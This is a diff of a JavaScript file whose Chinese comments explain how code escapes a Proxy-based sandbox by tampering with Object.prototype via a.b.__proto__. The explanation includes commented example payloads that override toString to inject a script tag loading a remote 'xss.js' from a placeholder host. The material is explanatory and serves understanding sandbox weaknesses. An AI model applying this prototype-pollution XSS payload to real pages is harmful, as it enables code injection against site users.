@@ -47,12 +47,14 @@
     createSandBox(testContent, testObj);
     //但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，
     //这时候，它只需要通过a.b.__proto__就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。
-    //a.b.__proto__.toString = ()=>{
-    // var script = document.createElement("script");
-    // script.src = "http://.../xss.js"
-    // script.type = "text/javascript";
-    // document.body.appendChild(script)
-    //}
+    //createSandbox(`
+    // a.b.__proto__.toString = ()=>{
+    //     new (()=>{}).constructor("var script = document.createElement('script');
+    //     script.src = 'http://xss.js';
+    //     script.type = 'text/javascript';
+    //     document.body.appendChild(script);")()
+    // }
+    // `,testObj)
     //通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码，
     //为什么代码里可以访问document呢？因为这本身是一个函数的赋值操作，并没有执行，所以也不存在被has函数拦截了。而当你调用toString的时候，已经是在外部的代码调用了，has函数更加无从知晓。
     //你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，
